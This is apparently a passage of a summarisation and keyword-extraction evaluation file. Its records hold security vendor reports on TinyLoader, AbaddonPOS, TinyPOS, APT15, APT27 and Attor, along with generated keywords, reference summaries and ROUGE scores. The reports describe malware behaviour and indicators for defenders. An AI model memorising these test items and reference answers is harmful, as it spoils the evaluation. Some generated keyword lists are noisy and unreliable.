reasonable efforts to include accurate and up-to-date information herein, Trend Micro makes no warranties or representations of any kind as to its accuracy, currency, or completeness. You agree that access to and use of and reliance on this document and the content thereof is at your own risk. Trend Micro disclaims all warranties of any kind, express or implied. Neither Trend Micro nor any party involved in creating, producing, or delivering this document shall be liable for any consequence, loss, or damage, including direct, indirect, special, consequential, loss of business profits, or special damages, whatsoever arising out of access to, use of, or inability to use, or in connection with the use of this document, or any errors or omissions in the content thereof. Use of this information constitutes acceptance for use in an \u201cas is\u201d condition.Trend Micro | Backdoor as a Software Suite: How TinyLoader Distributes and Upgrades PoS ThreatsIntroduction The tandem of TinyLoader backdoor and a point-of-sale (PoS) threat, AbaddonPOS was first reportedly seen in November 2015. When we noticed a sudden spike in AbaddonPOS detections just this January, TinyPOS, another PoS malware strain, has also reared its ugly head that time. This prompted us to probe further on these threats and check if they are in any way related to one another.Our analysis reveals that TinyLoader, a backdoor used for secondary malware infection, is distributing and managing the upgrades of AbaddonPOS. Likewise, TinyLoader is also spreading TinyPOS variants. This leads us to conclude that the operators behind TinyPOS and AbaddonPOS are one and the same.In this technical brief, we\u2019ll discuss the ties that bind TinyLoader with two notorious PoS threats\u2014AbaddonPOS and TinyPOS, including how the perpetrators behind this operation deployed their arsenals. TinyLoader\u2014The Not-So-Missing Link? It\u2019s always good to examine the entry points of PoS malware in their target environment to understand these threats better. Initial information on AbaddonPOS details its links to TinyLoader backdoor, which Trend Micro detects as BKDR_TINY, BKDR64_TINY or TROJ_TINY.TinyLoader can run any shellcode on the system and its primary function is to introduce secondary infections on the environment. That being said, seeing TinyLoader in an environment is not the leading or sole indicator of PoS threats as it can be directed to do other malicious activities. For the purpose of this write-up, we checked any indicator connecting AbaddonPOS and TinyPOS.Based on our Smart Protection Network data, there are more TinyLoader-related infections in Asia-Pacific and North America from the period of January-April 2016. Our data also indicate that 64% of our detections on TinyLoader infections are mostly Windows 7 (64 Bit) platforms.1Trend Micro | Backdoor as a Software Suite: How TinyLoader Distributes and Upgrades PoS ThreatsFigure 1. Global distribution of TinyLoader-related infections (January-April 2016)Method of Operations: Testing First Before Mass Deployment As seen in the geographical map above, there\u2019s a widespread presence of TinyLoader-related infections across the globe. With this established footprint, TinyLoader can selectively introduce secondary infections based on what\u2019s interesting in the environment it is running on. This business model is true to any malware as a service.TinyLoader used two very small components: a module that can take a screenshot (grabber), and a module that functions as a process enumerator. Both modules are very small in size and simply loaded into memory. But these modules do not necessarily have any malicious payload. They are just used to gather information or reconnaissance on infected systems. During our research, we identified that screenshot grabber were deployed several times a day for over an extended period for collecting data on the system.2Trend Micro | Backdoor as a Software Suite: How TinyLoader Distributes and Upgrades PoS ThreatsFigure 2. TinyLoader uses two small components for reconnaissanceAfter TinyLoader identifies an infected system, the operator then may choose to deploy a secondary payload. In this particular case, it was AbaddonPOS first, followed by TinyPOS. We have identified two periods where AbaddonPOS variants were massively distributed:3Trend Micro | Backdoor as a Software Suite: How TinyLoader Distributes and Upgrades PoS ThreatsFigure 3. North America is heavily affected by the first wave of AbaddonPOS attacks, aroundJanuary 29-30, 20164Trend Micro | Backdoor as a Software Suite: How TinyLoader Distributes and Upgrades PoS ThreatsFigure 3. The second wave of AbaddonPOS attacks mostly hit countries in Europe, aroundMarch 31 \u2013 April 1, 2016Since most of the infected environment run on Windows 7 operating system (OS), AbaddonPOS is stored in %PROGRAMDATA%. In its initial wave, it used the file name, scheduler.exe and the mutex, MR_D, resembling some of the documented behaviors of this PoS malware in 2015. After this initial mass-deployment, there were small incremental file variations being introduced throughout February 2016.Around March of this year, we started seeing similar detections on %PROGRAMDATA% stemming from TinyLoader. However, it used a different file name\u2014conhost.exe. Our analysis shows that this is still AbaddonPOS with very slight modifications. It uses now the mutex, file names, scheduler.exe and conhost.exe. The said binary was downloaded on the same site hosting AbaddonPOS. This binary, which we dubbed as updater component, was distributed5Trend Micro | Backdoor as a Software Suite: How TinyLoader Distributes and Upgrades PoS Threatsaround February 29, 2016, a month after the initial wave. The file\u2019s logic was quite simple:Figure 4. The update component enumerates running processes and checks for familiar filenames in All User's application data folder. It then terminates these if found.Aside from %ProgramData%\\scheduler.exe, the updater component looks for another file, conhost.exe in the same directory, which seemed unusual. However, this made sense when AbaddonPOS was deployed with the file name, %PROGRAMDATA% \\conhost.exe last March 2016. TinyLoader was preparing to upgrade the existing installations of the said PoS malware. We saw that TinyLoader not only distributed AbaddonPOS but also managed the upgrades of this PoS threat.6Trend Micro | Backdoor as a Software Suite: How TinyLoader Distributes and Upgrades PoS ThreatsTies that Bind: The TinyPOS-AbaddonPOS Connection When a new PoS malware strain, TinyPOS emerged in threat landscape, we checked its connection to AbaddonPOS. Since TinyPOS is hosted on the same server as AbaddonPOS (see diagram below), it prompted us to dig deeper into these threats. We were able to identify that TinyLoader was distributing both PoS threats.Figure 5. Mapping of file sources and C&C serversIn addition, we also saw the updater component that cleans up process names used by AbaddonPOS (scheduler.exe and conhost.exe) and TinyPOS (wmi_service.exe).7Trend Micro | Backdoor as a Software Suite: How TinyLoader Distributes and Upgrades PoS ThreatsFigure 6. New updater component logicLast April 2016, TinyPOS started sporting tactics commonly associated with PoS RAM scraper. PoS RAM scrapers usually look for process names either for exclusion (similar to what AbaddonPOS did) or for targeting. Targeting is a selective method of seeking out a known TinyPOS used a particular binary in memory: resdbs.exe. This binary otherwise known as MICROS \u00ae Database Service is part of several MICROS\u00ae software solutions. Various industries like retail typically use these software solutions.TinyPOS scans all other processes not included in the whitelist. It also creates a separate thread that only monitors the Micros service. With this dedicated thread, this malware increases its chances of capturing credit card information from the resdbs.exe process memory.Figure 7. TinyPOS creates a separate thread dedicated to resdbs.exe monitoring.It is also worth noting that AbaddonPOS also has a separate thread for monitoring specific processes. However, our samples show that its list is blank. The only difference between TinyPOS and AbaddonPOS in this particular context is the coding approach. It seems that TinyPOS is a simplified version of AbbadonPOS.9Trend Micro | Backdoor as a Software Suite: How TinyLoader Distributes and Upgrades PoS ThreatsFigure 8. AbaddonPOS coding approachTargeting PoS software components are very common. MalumPOS and RawPOS are some examples of PoS threats that employed the same technique. Both TinyPOS and AbaddonPOS modified the process list to match the target environment\u2019s point-of-sale software, similar to what RawPOS did.We looked at how newer versions of AbaddonPOS were distributed and found that the initial versions of TinyPOS were distributed the same way. AbaddonPOS were tested first via selective deployment and only when these deployments were proven successful will they only go for wide distribution. We have yet to see a mass deployment of TinyPOS but we\u2019re already seeing infections within the United States and some parts of Europe.10Trend Micro | Backdoor as a Software Suite: How TinyLoader Distributes and Upgrades PoS ThreatsWidespread Distribution Through our research, we established that AbaddonPOS and TinyPOS are one and the same PoS family. They cast a wide net to hit as many environments as possible and to prepare that environment for secondary infections. This tactic is reminiscent of another PoS threat, GamaPOS.The combined infections of AbaddonPOS and TinyPOS have struck various industries:\u2022 Technology\u2022 Healthcare\u2022 Transportation\u2022 Education\u2022 Manufacturing\u2022 Fast-Moving Consumer Goods (FMCG)\u2022 GovernmentThis list of affected industries seems extensive but not surprising, particularly in the United States. According to a survey released by the Strawhecker Group (TSG), only 37% of US merchant locations are EMV-ready after the October 1, 2015 liability shift. The same survey also revealed that the implementation has been slower than expected. The estimated adoption rate should be at least 90% by 2017.As merchants tried to catch up to EMV implementation, attackers are already showing a keen interest at other verticals to hit before higher adoption takes place. They (attackers) are using their malicious tools to infect as many PoS systems as possible before point-to-point encryption will be fully adopted.When the card data is not encrypted in the reader, this makes a terminal even with Chip-and- Pin susceptible to PoS RAM scraper malware. A non-EMV enabled terminal also allows anyone who has duplicated card data (card-in-hand) to walk in an establishment and use that duplicated card. He/she can also place an online transaction where details such as the three-digit security code and billing address are not verified.11Trend Micro | Backdoor as a Software Suite: How TinyLoader Distributes and Upgrades PoS ThreatsChallenges and Recommendations On their own, a backdoor and a point-of-sale (PoS) malware can pose great threats to enterprises and small and medium-sized businesses (SMBs). As a tandem, these two can lead to stealthier and more flexible attacks.The use of TinyLoader with a PoS threat is quite effective. Its multicomponent architecture allows several small modules to be built depending on the need. This makes attacks less noticeable, thus avoiding detection. The small modules also enable the secondary infection to be successful.The command-and-control (C&C) server of TinyLoader needs not to be a server where it gets the components. It can be directed to connect to another site for downloading the component. The downloaded component (secondary malware) can then report to its own C&C server.As detailed above, TinyLoader was used like a software management suite to manage the deployment and upgrade of both AbaddonPOS/TinyPOS. Analyzing these samples individually would not lead to any conclusion. Acquiring only the TinyLoader executable absolutely made no sense because one has to observe how other components are being used.This presents challenges in both static and dynamic analysis. In static analysis of TinyLoader, only a TCP socket connection to a pre-defined IP address and port is visible. In dynamic analysis (where most sandboxes can only run the sample for a few minutes), a similar raw socket connection is also seen. This means that only through actual infection can one observe the complete infection chain\u2014from launching tools and gathering information on the system to secondary infection.The businesses affected by this combined backdoor and point-of-sale threat were spread out between single seat infections and SMBs. TinyLoader used a high numbered port to communicate back to its own C&C server while being able to introduce additional files in the environment via HTTP requests. This spells the importance of looking into outbound requests (or traffic leaving the environment) aside from the common practice of restricting inbound and outbound requests to certain known services.Trend Micro protects customers from all threats related to TinyLoader. To protect enterprises from malware with PoS RAM-scraping capabilities, it is best to employ endpoint application control that reduces attack exposure by ensuring only updates associated with whitelisted applications can be installed. Endpoint solutions such as Trend Micro\u2122 Security, Trend Micro\u2122 Smart Protection Suites, and Trend Micro Worry-Free\u2122 Business Security can protect users systems from AbaddonPOS, TinyPOS, and TinyLoader backdoor by detecting these malicious files. While Trend Micro detects all indicators that were discussed here, we still are monitoring the progression of this threat.12Trend Micro | Backdoor as a Software Suite: How TinyLoader Distributes and Upgrades PoS ThreatsAppendix: Example Indicators of Compromise TinyPOSTinyLoader screen grabber Tiny Loader process enumerator TinyLoader Update module for world safe for exchanging digital information. Our innovative solutions for consumers, businesses and governments provide layered content security to protect information on mobile devices, endpoints, gateways, servers and the cloud. All of our solutions are powered by cloud-based global threat intelligence, the Trend Micro\u2122 Smart Protection Network\u2122, and are supported by over 1,200 threat experts around the globe. For more information, visit www.trendmicro.com.t-balllogo are\u00a92016 by Trend Micro, Incorporated. All rights reserved. Trend Micro and the Trend Micro trademarks of Trend Micro, Incorporated. All other product or company names may be trademarks or registered trademarks of their owners.trademarks or registered10101 N. De Anza Blvd. Cupertino, CA 95014U.S. toll free: 1 +800.228.5651 Phone: 1 +408.257.1500 Fax: 1 +408.257.2003 ", "generated_text": "analysis; Trend Micro; ties; TinyLoader; AbaddonPOS; use; secondary infections; the environment; links; BKDR_TINY; BKDR64_TINY; TROJ_TINY; the ties; the TinyPOS-AbaddonPOS connection; the upgrades; change; control; the new products; AbaddonPOS variants; the same; compromise; antivirus software; the malware; Advanced May; detection; the same actors; execution; detection; XOR; IE; backdoors; the same operators; technical details; the ties; the same kind; The document; recommendations; a safe environment.", "ref_text": "<START-1>The report by Trend Micro examines the connection between the TinyLoader backdoor and two point-of-sale (PoS) malware threats - AbaddonPOS and TinyPOS. It found that TinyLoader is being used to distribute and manage upgrades for both AbaddonPOS and TinyPOS, indicating the operators behind the two PoS malwares are likely the same. The main findings are: - TinyLoader is a backdoor that can introduce secondary infections into an environment after doing reconnaissance using small components. It was initially linked to AbaddonPOS in late 2015. - Two waves of AbaddonPOS infections were observed in early 2016, first targeting North America then Europe. The malware was distributed via TinyLoader. - An \"updater component\" was later distributed to replace older AbaddonPOS filenames with a new version. - In early 2016, a new PoS threat called TinyPOS emerged, also distributed by TinyLoader. It shares code similarities with AbaddonPOS. - TinyPOS showed new capabilities to target specific PoS software processes, indicating it is likely an upgraded version of AbaddonPOS. - The infections targeted a wide range of industries globally. This is likely due to the slow adoption of EMV standards making PoS systems vulnerable. - The use of TinyLoader allows stealthy distribution and management of PoS malware. Its components make analysis and detection challenging. The report highlights the need for tracking outbound network traffic for signs of compromise, and using application control to block untrusted programs. Trend Micro continues to monitor this threat's evolution. <END-1>", "t5/keyword/hint_hit_precision": 0.3157894736842105, "t5/word/hint_hit_recall": 0.06722689075630252, "gpt3/lexical/rouge_rouge1": 0.4382022471910112, "gpt3/lexical/rouge_rouge2": 0.12994350282485875, "gpt3/lexical/rouge_rougeL": 0.2808988764044944, "gpt3/lexical/rouge_rougeLsum": 0.2808988764044944, "gpt3_generated_text": ["The article from Trend Micro's Security Intelligence Blog discusses the connection between TinyLoader, a backdoor used for secondary malware infections, and two notorious point-of-sale (PoS) threats\u2014AbaddonPOS and TinyPOS. The analysis reveals that TinyLoader is distributing and managing the upgrades of AbaddonPOS, as well as spreading TinyPOS variants. The operators behind this operation are believed to be the same, as the ties between the threats indicate a coordinated effort. The article provides technical details on how TinyLoader operates and its role in the distribution of PoS threats. Recommendations are also given to ensure a safe environment against these threats. The document emphasizes the importance of antivirus software and advanced detection techniques to detect and mitigate the impact of the malware."]}, {"split_name": "val", "sample_id": "val_44", "prompt_text": "Extract the keywords: APT15 is alive and strong: An analysis of RoyalCli and RoyalDNS In May 2017, NCC Group's Incident Response team reacted to an ongoing incident where our client, which provides a range of services to UK Government, su\ufb00ered a network compromise involving the advanced persistent threat group APT15.APT15 is also known as, Ke3chang, Mirage, Vixen Panda GREF and Playful Dragon.A number of sensitive documents were stolen by the attackers during the incident and we believe APT15 was targeting information related to UK government departments and military technology. APT15 expands its arsenal During our analysis of the compromise, we identi\ufb01ed new backdoors that now appear to be part of APT15's toolset. The backdoor BS2005 - which has traditionally been used by the group - now appears alongside the additional backdoors RoyalCli and RoyalDNS. The RoyalCli backdoor appears to be an evolution of BS2005 and uses familiar encryption and encoding routines. The name RoyalCli was chosen by us due to a debugging path left in the binary:c:\\users\\wizard\\documents\\visual studio 2010\\Projects\\RoyalCli\\Release\\RoyalCli.pdbRoyalCli and BS2005 both communicate with the attacker's command and control (C2) through Internet Explorer (IE) by using the COM interface IWebBrowser2. Due to the nature of the technique, this results in C2 data being cached to disk by the IE process; we'll get to this later. Analysis of the domains and IP address infrastructure used by APT15 identi\ufb01ed a number of similar possible domains, shown at the bottom of the post. These appeared to be hosted on either Linode or Google Cloud, with a preference for using the ASN AS63949. All of the backdoors identi\ufb01ed - excluding RoyalDNS - required APT15 to create batch scripts in order to install its persistence mechanism. This was achieved through the use of a simple Windows run key. We believe that APT15 could have employed this technique in order toevade behavioural detection, rather than due to a lack of sophistication or development capability. Additional tools were recovered during the incident, including a network scanning/enumeration tool, the archiving tool WinRAR and a bespoke Microsoft SharePoint enumeration and data dumping tool, known as 'spwebmember'. spwebmember was written in Microsoft .NET and includes hardcoded values for client project names for data extraction. The tool would connect to the SQL SharePoint database and issue a query to dump all data from the database to a temporary \ufb01le a\ufb03xed with 'spdata'. The group also used keyloggers and their own .NET tool to enumerate folders and dump data from Microsoft Exchange mailboxes. APT15 was also observed using Mimikatz to dump credentials and generate Kerberos golden tickets. This allowed the group to persist in the victim's network in the event of remediation actions being undertaken, such as a password reset. APT15 lives o\ufb00 the land Upon ejection from the network, APT15 managed to regain access a couple of weeks later via the corporate VPN solution with a stolen VPN certi\ufb01cate, which they had extracted from a compromised host. This time, APT15 opted for a DNS based backdoor: RoyalDNS. The persistence mechanism used by RoyalDNS was achieved through a service called 'Nwsapagent'. C2 of this backdoor was performed using the TXT record of the DNS protocol. C2 was communicating with the domain 'andspurs[.]com'. We mentioned earlier that due to the nature of the IE injection technique used by the HTTP- based backdoors, a number of C2 commands were cached to disk. We were able to recover these \ufb01les and reverse engineer the encoding routine used by the backdoors in order to uncover the exact commands executed by the attacker. In total, we were able to recover more than 200 commands executed by the attacker against the compromised hosts and were able to gain a clear insight into the attacker's TTPs. Our decode scripts can be found on our Github page: url (url Analysis of the commands executed by APT15 rea\ufb03rmed the group's preference to 'live o\ufb00 the land'. They utilised Windows commands in order to enumerate and conduct reconnaissance activities such as tasklist.exe, ping.exe, netstat.exe, net.exe, systeminfo.exe, ipcon\ufb01g.exe and bcp.exe. Lateral movement was conducted through by a combination of net command, mounting the C$ share of hosts and manually copying \ufb01les to or from compromised hosts. APT15 then used a tool known as RemoteExec (similar to Microsoft's Psexec) in order to remotely execute batch scripts and binaries.During our analysis of the decoded attacker commands we noticed a typographical mistake, shown below in the folder name 'systme'. This indicates that a human operative was executing commands on a command line style interface, rather than an automated or GUI process.IOCs through the use of these backdoors. These, along with YARA signatures for the backdoors identi\ufb01ed, can be found in the Github repository linked above. Domains The RoyalCli backdoor was attempting to communicate to the following domains:News.memozilla[.]org video.memozilla[.]orgThe BS2005 backdoor utilised the following domains for C2:Run.linodepower[.]com Singa.linodepower[.]com log.autocount[.]orgRoyalDNS backdoor was seen communicating to the domain:andspurs[.]comPossible linked APT15 domains include:Micakiz.wikaba[.]org dnsapp[.]infoPublished date: 10 March 2018Written by: Rob Smallridge(url By Service Cyber Security Risk Management & Governance Website Performance CareersFilter By Date 2018 (/uk/about-us/newsroom-and-events/blogs/?Year=2018)March (5) (/uk/about-us/newsroom-and-events/blogs/?Year=2018&Month=3) February (7) (/uk/about-us/newsroom-and-events/blogs/?Year=2018&Month=2) January (10) (/uk/about-us/newsroom-and-events/blogs/?Year=2018&Month=1)2017 (/uk/about-us/newsroom-and-events/blogs/?Year=2017) 2016 (/uk/about-us/newsroom-and-events/blogs/?Year=2016) 2015 (/uk/about-us/newsroom-and-events/blogs/?Year=2015) 2014 (/uk/about-us/newsroom-and-events/blogs/?Year=2014) 2013 (/uk/about-us/newsroom-and-events/blogs/?Year=2013) 2012 (/uk/about-us/newsroom-and-events/blogs/?Year=2012) 2011 (/uk/about-us/newsroom-and-events/blogs/?Year=2011) 2010 (/uk/about-us/newsroom-and-events/blogs/?Year=2010)Call us on: +44(0)161 820 6646 (tel:+441618206646)Newsroom & EventsIn the media (/uk/about-us/newsroom-and-events/in-the-media/) News (/uk/about-us/newsroom-and-events/news/) Press Releases (/uk/about-us/newsroom-and-events/press-releases/) Events (/uk/about-us/newsroom-and-events/events/) Blogs (/uk/about-us/newsroom-and-events/blogs/) About Us History (/uk/about-us/what-we-do/history/) Board & Senior Management (/uk/about-us/what-we-do/board-and-executive- committee/) Careers (/uk/about-us/careers/) Resources (/uk/about-us/resources/) O\ufb03ce Locations (/uk/about-us/what-we-do/o\ufb03ce-locations/) \u00a92018 NCC Group. All rights reserved. Investor Relations Share Price (/uk/about-us/investor-relations/share-price/) Results & Presentations (/uk/about-us/investor-relations/results-and-presentations/) Stock Exchange Announcements (/uk/about-us/investor-relations/stock-exchange- Terms & Conditions (/uk/about-us/terms-and-conditions/) Privacy Policy (/uk/about-us/privacy-policy/) Cookie Policy (/uk/about-us/privacy-policy/cookie-policy/) Accessibility (/uk/about-us/accessibility/) Sitemap (/uk/sitemap/) Latest from @NCCGroupplc (url COOK, a provider of high-quality frozen meals, suspected that slow load times were negatively a\ufb00ecting its business. Download our case study for an in-depth analysis on how NCC Group measured and improved the performance of COOK\u2019s website url us/resources/cook-real-user-monitoring-case-study/?resources=Case+Studies \u2026 (url Reply (url Retweet (url (url Despite the fact #GDPR (url will be enforced from May 2018, many organisations remain unclear on the topic of breach noti\ufb01cation under #GDPR (url For best practice advice on how to communicate a personal data breach download our ebook now url breach-noti\ufb01cation-under-gdpr-how-to-communicate-a-personal-data-breach/? research=Whitepapers \u2026 (url\uf099Reply (url Retweet (url (url ", "generated_text": "the group; APT15; UK government; government; Ke3chang; Mirage; Vixen Panda; Playful Dragon; documents; the attackers; the group; new backdoors; RoyalCli; RoyalDNS; control; BS2005; BS2005 commands; the command; control; Windows commands; an encrypted encoding routine; a set; database; data; Mimikatz; credentials; Kerberos Golden Tickets; a group; the land; a compromised server; the victim; the network; a VPN; a group; command; control; visitors; the threat actor; the group; the indicators; compromise; identity.", "ref_text": "<START-1>APT15, also known as Ke3chang, Mirage, Vixen Panda GREF and Playful Dragon, is a sophisticated advanced persistent threat group that targeted UK government departments and military technology. The group expanded its arsenal during the incident, including new backdoors such as BS2005, RoyalCli, and RoyalDNS. RoyalCli injects commands into Internet Explorer to communicate with C&C servers. RoyalDNS uses DNS TXT records. APT15 used additional tools such as WinRAR, Mimikatz, and spwebmember for data extraction, keylogging, and enumeration. The group also conducted lateral movement through net command, mounting the C$ share of hosts, and manually copying files. APT15 used stolen VPN certificates to regain access after being ejected from the network. Analysis of cached IE web browser data revealed over 200 commands executed by APT15 during the intrusion. APT15 relies on living off the land tactics using native Windows tools for reconnaissance and lateral movement. <END-1>", "t5/keyword/hint_hit_precision": 0.38095238095238093, "t5/word/hint_hit_recall": 0.16083916083916083, "gpt3/lexical/rouge_rouge1": 0.5494505494505495, "gpt3/lexical/rouge_rouge2": 0.25092250922509224, "gpt3/lexical/rouge_rougeL": 0.358974358974359, "gpt3/lexical/rouge_rougeLsum": 0.358974358974359, "gpt3_generated_text": ["The article discusses the ongoing threat posed by the advanced persistent threat group APT15, also known as Ke3chang, Mirage, Vixen Panda, and Playful Dragon, targeting sensitive information related to UK government departments and military technology. The group has expanded its arsenal with new backdoors, including RoyalCli and RoyalDNS, which communicate with the attacker's command and control through Internet Explorer. APT15 also employs tools such as Mimikatz to dump credentials and generate Kerberos golden tickets for persistence in the victim's network. The group utilizes Windows commands for reconnaissance activities and to live off the land, gaining access through compromised hosts and VPN solutions. The article provides insight into the group's tactics, techniques, and procedures, highlighting the importance of vigilance and cybersecurity measures to defend against such threats."]}, {"split_name": "val", "sample_id": "val_45", "prompt_text": "Extract the keywords: German govt warns of APT27 hackers backdooring business networksbleepingcomputer.com/news/security/german-govt-warns-of-apt27-hackers-backdooring-business-networksThe BfV German domestic intelligence services (short for Bun des amt f\u00fcr Ver fas sungs - schutz) warn of ongoing attacks coordinated by the APT27 Chinese-backed hacking group.This active campaign is targeting German commercial organizations, with the attackers using the HyperBro remote access trojans (RAT) to backdoor their networks.HyperBro helps the threat actors maintain persistence on the victims' networks by acting as an in-memory backdoor with remote administration capabilities.The agency said the threat group's goal is to steal sensitive information and may also attempt to target their victims' customers in supply chain attacks.\"The Federal Office for the Protection of the Constitution (BfV (Federal Office for the Protection of the Constitution)) has information about an ongoing cyber espionage campaign by the cyber attack group APT27 using the malware variant HYPERBRO against German commercial companies,\" the BfV said.\"It cannot be ruled out that the actors, in addition to stealing business secrets and intellectual property, also try to infiltrate the networks of (corporate) customers or service providers (supply chain attack).\"1/3The BfV also published indicators of compromise (IOCs) and YARA rules to help targeted German organizations to check for HyperBro infections and connections to APT27 command-and-control (C2) servers.HyperBro infection chain (BfV)Breaching networks via Zoho and Exchange servers APT27 (also tracked as TG-3390, Emissary Panda, BRONZE UNION, Iron Tiger, and LuckyMouse) is a Chinese-sponsored threat group active since at least 2010 and known for its focus on information theft and cyberespionage campaigns.The German intelligence agency says APT27 has been exploiting flaws in Zoho AdSelf Service Plus software, an enterprise password management solution for Active Directory and cloud apps, since March 2021.This aligns with previous reports of Zoho ManageEngine installations being the target of multiple campaigns in 2021, coordinated by nation-state hackers using tactics and tooling similar to those employed by APT27.They first used an ADSelfService zero-day exploit until mid-September, then switched to an n-day AdSelfService exploit, and started exploiting a ServiceDesk bug beginning with October 25.2/3Zoho ManageEngine campaigns (Unit 42)In these attacks, they successfully compromised at least nine organizations from critical sectors worldwide, including defense, healthcare, energy, technology, and education, according to Palo Alto Networks researchers.In light of these campaigns, the FBI and CISA issued joint advisories (1, 2) warning of APT actors exploiting ManageEngine flaws to drop web shells on the networks of breached critical infrastructure orgs.APT27 and other Chinese-backed hacking groups were also linked to attacks exploiting critical ProxyLogon bugs in early March 2021 that allowed them to take over and steal data from unpatched Microsoft Exchange servers worldwide.US and allies (the European Union, the United Kingdom, and NATO) officially blamed China in June for last year's widespread Microsoft Exchange hacking campaign.3/3 ", "generated_text": "German; the BfV; Cyberespionage; APT27; Chinese; at least 2010; vulnerabilities; Zoho ManageEngine; Active Directory; tools; ProxyLogon; a campaign; March 2021; Microsoft Exchange servers; the group; infrastructure; the FBI; CISA; indicators; compromise; IOCs; YARA rules; network compromise; the attacks; sensitive information; supply chain attacks; the attack.", "ref_text": "<START-1>The document describes warnings from Germany's BfV intelligence agency about ongoing cyberespionage attacks by the Chinese state-sponsored hacking group APT27. The attackers are targeting German commercial organizations by exploiting vulnerabilities to deploy the HyperBro remote access trojan (RAT) and backdoor their networks. APT27's goal is to steal sensitive information and possibly infiltrate the networks of the targeted companies' customers and service providers in supply chain attacks. The BfV published indicators of compromise and detection rules to help organizations check for infections. APT27 has been actively exploiting flaws in Zoho's AdSelfService Plus software since March 2021 to breach networks, similar to other campaigns targeting Zoho ManageEngine products last year. The group also exploited Exchange Server ProxyLogon vulnerabilities in March 2021 to compromise unpatched systems globally. APT27 is a long-running Chinese group active since 2010 and known for cyberespionage focused on stealing information. The United States and allies have officially blamed China for the widespread Exchange server attacks in 2021 tied to APT27 and other China-linked groups. In summary, Germany is warning businesses of ongoing cyberespionage activities by the Chinese-backed hacker group APT27 abusing software vulnerabilities to infiltrate and backdoor corporate networks to steal data. <END-1>", "t5/keyword/hint_hit_precision": 0.5555555555555556, "t5/word/hint_hit_recall": 0.11917098445595854, "gpt3/lexical/rouge_rouge1": 0.5534591194968553, "gpt3/lexical/rouge_rouge2": 0.25316455696202533, "gpt3/lexical/rouge_rougeL": 0.339622641509434, "gpt3/lexical/rouge_rougeLsum": 0.339622641509434, "gpt3_generated_text": ["The BfV, Germany's domestic intelligence service, has issued a warning about ongoing cyber espionage attacks by the Chinese-backed hacking group APT27. These attacks target German commercial organizations using the HyperBro remote access trojan to backdoor their networks and steal sensitive information. APT27 has been exploiting vulnerabilities in Zoho ManageEngine software since March 2021, breaching networks and compromising at least nine organizations globally. In response, the FBI and CISA have issued advisories, and the BfV has published indicators of compromise and YARA rules to help organizations detect and defend against these attacks. The group has also been linked to exploiting critical ProxyLogon bugs in Microsoft Exchange servers, highlighting the ongoing threat of cyber espionage campaigns by APT27."]}, {"split_name": "val", "sample_id": "val_46", "prompt_text": "Extract the keywords: ESET Research white papersTLP: WHITEAT COMMANDS, MEET ATTOR, A FANTASY CREATURE AND ALSO A SPY PLATFORMAuthor: Zuzana Hromcov\u00e1In the fantasy book \u201cA Court of Thorns and Roses\u201d by Sarah J. Maas, Attor was an evil Faerie. In that book, the Faeries ruled over all the known world and humans were their slaves.In cybersecurity, Attor is a cyberespionage platform designed to exfiltrate valuable information from its victims. SUMMARY ESET researchers have discovered a previously unreported cyberespionage platform used in targeted attacks since at least 2013 . Focusing on diplomatic missions and governmental institutions, Attor is designed specifically to attack privacy-concerned targets . Its most interesting features are a complex modular architecture, elaborate network communications, and a unique plugin to fingerprint GSM devices .Attor\u2019s core lies in its dispatcher, which serves as a management and synchronization unit for additional plugins . It also provides an interface for the plugins to call Windows APIs and cryptographic functions indirectly .Plugins themselves are heavily synchronized, with network communication alone being spread across four different components, each implementing a different layer . This allows the malware to communicate with its FTP C&C server, which resides on an onion domain . Tor is used for communication, aiming for anonymity and untraceability, and the overall setup makes it impossible to analyze the communication unless all pieces of the puzzle have been collected .Apart from its dispatcher, all of Attor\u2019s capabilities are provided as plugins . This allows the attackers to customize the platform on a per-victim basis . The most notable plugin can detect connected GSM/ GPRS modems or mobile devices; this allows Attor to speak to them directly using the AT command set, in order to collect sensitive information such as the IMEI, IMSI or MSISDN numbers, possibly identifying both the device and its subscriber . Other plugins provide persistence, an exfiltration channel, C&C communication and several further spying capabilities .We gave Attor its name because of two notable features of the platform: the AT protocol used by the GSM plugin, and that Tor is employed for network communication .2 THE ESPIONAGE CAMPAIGN Attor has been used in a highly targeted espionage campaign; we have only seen a few dozen victims . In general, Attor seems to be targeting Russian-speaking users . This claim is supported by the fact that most of the targets are located in Russia, and that the malware focuses on Russian applications: for example, it takes screenshots of Russian Instant Messenger (IM) apps .Other targets are located in Eastern Europe, and they include diplomatic missions and governmental institutions .RussiaUkraineSlovakiaLithuaniaTurkeyFigure 1 // Countries affected by Attor3The campaign has been active in two waves, with different implementations of the platform, and substantial changes in architecture . We saw the first activity in 2013, while the most recent version has been active at least since 2018, with the latest samples detected in July 2019 .We don\u2019t know how the malware was initially distributed to its victims and executed . It is also difficult to establish the exact timeline of the operation, especially with such a small number of targets . The malware may have been used much longer: it could have been in use for years before we encountered it .The PE timestamp information in the samples suggests compilation dates between 2005 and 2009 for the older version, and between 2011 and 2013 for the newer, but this information is likely fabricated . For example, in one of the samples1, the PE header contains July 14th, 2009 as the compilation date, which is inconsistent with other metadata . Namely, the product version 1 .626 .7601 .17514 in the sample\u2019s version info was apparently copied from a Windows 7 RTM library (usp10.dll), in an attempt to make the file look more credible . However, that library was only released on November 20th, 2010, and thus its product version could not have been known in July 2009 . This is a clear indicator that the timestamp is fake .Therefore, we rely solely on our telemetry, which suggests that samples of the older version were used between 2013 and 2017, while the updated, modernized version has been in use since 2018 .Figure 2 // Metadata from the malicious file showing that the PE timestamp was forged to an older date1 SHA-1: 6DEC7C66CB5E6F86CDDBE313B604603731C78E2043 THE PLATFORM ARCHITECTURE In this paper, we focus on the newer version of Attor that has been active since 2018 . This version consists of a dispatcher and loadable plugins, that use shared folders for synchronization, and provide functionality to each other .In the first step of a compromise, a dropper delivers the main dispatcher and a number of plugins, and then loads the dispatcher, which is a dynamic-link library .The dispatcher injects itself into almost all running processes and loads additional plugins within each of these processes . Attor avoids some system processes and Symantec products .A feature characteristic to Attor is that the plugins then choose in which of the processes to activate their payload . For example, a Screengrabber plugin only captures screenshots of the window of a process in which it is injected, which allows monitoring only processes that are of interest of the attackers (such as IM applications or web browsers) .Attor has built-in mechanisms for adding new plugins, for updating itself, and for automatically exfiltrating collected data and log files .In subsequent sections, we explain how individual components of the platform contribute to these mechanisms, as is also illustrated in Figure 3 .ID 0x00 DispatcherLoadsInstallsPLUGINS PERSISTENCEID 0x10Installer/watchdogCOLLECTIONEXFILTRATIONCOMMAND AND CONTROLFTPID 0x06 File uploaderDownloads commandsID 0x06Command dispatcherStores downloaded plugins,updates and other \ufb01lesStorecollected dataUpload 